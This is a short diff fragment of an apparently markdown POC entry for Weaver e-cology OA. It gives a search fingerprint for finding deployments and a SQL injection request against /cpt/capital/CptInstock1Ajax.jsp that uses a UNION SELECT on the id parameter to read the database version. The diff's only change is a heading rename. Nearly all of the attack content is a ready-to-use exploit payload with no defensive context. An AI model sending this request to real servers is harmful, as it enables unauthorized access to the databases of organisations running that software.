@@ -8,7 +8,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1# HTTP/1.1
